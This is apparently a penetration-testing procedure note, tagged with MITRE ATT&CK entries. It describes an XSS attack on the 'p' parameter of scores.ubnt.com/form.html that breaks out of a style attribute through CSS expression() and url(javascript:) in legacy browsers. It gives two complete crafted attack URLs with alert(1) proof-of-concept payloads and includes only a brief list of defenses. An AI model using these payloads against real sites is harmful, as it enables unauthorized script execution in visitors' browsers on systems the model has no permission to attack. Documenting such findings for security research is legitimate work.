---
tags:
  - xss
  - payload-testing
  - javascript
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
techniques:
  - '[[JavaScript]]'
sub_techniques: []
id: 1625c2d6-5b18-4246-80e3-baedbac7e449
created_at: '2025-12-14T03:16:37.376Z'
updated_at: '2025-12-14T03:16:37.376Z'
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Test XSS Payloads in p Parameter

## Summary

This procedure tests JavaScript payloads injected into the 'p' parameter of scores.ubnt.com/form.html, exploiting the style attribute to execute code in older browsers via CSS expression() or url() properties.

## Description

Targeting the identified vulnerability, payloads are crafted to break out of the style context and trigger script execution. This works in legacy browsers due to deprecated features like expression(). Outcomes include proof-of-concept alerts, validating the bypass of previous sanitization attempts.

## Requirements

1. Older browser (e.g., IE 11 or equivalent for expression() support)
2. URL encoding knowledge for payloads
3. Proxy tool optional for interception

## Defense

Defensive measures and detection strategies:

- Strip or encode dangerous CSS properties like expression() and url(javascript:)
- Enforce modern browser requirements or polyfills that disable legacy features
- Log and alert on style attribute manipulations

## Objectives

1. Execute benign JavaScript to confirm control
2. Demonstrate payload efficacy across vectors
3. Identify browser-specific behaviors

## Instructions

### Step 1: Inject Basic Expression Payload

**Context**: Use CSS expression() to run JavaScript directly in the style attribute.

Construct URL: https://scores.ubnt.com/form.html?uid=259&p=);xss:expression(alert(1));border-image:url(foobar

Load in older browser and check for alert.

> Alert(1) indicates successful execution; adjust for URL encoding if needed.

### Step 2: Test URL Handler Payload

**Context**: Leverage url() with javascript: scheme for alternative execution.

URL: https://scores.ubnt.com/form.html?uid=259&p=);border-image: url(javascript:alert(1));content:url(foobar

Observe if script triggers.

> This confirms multiple vectors, enhancing exploit reliability.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[JavaScript]]
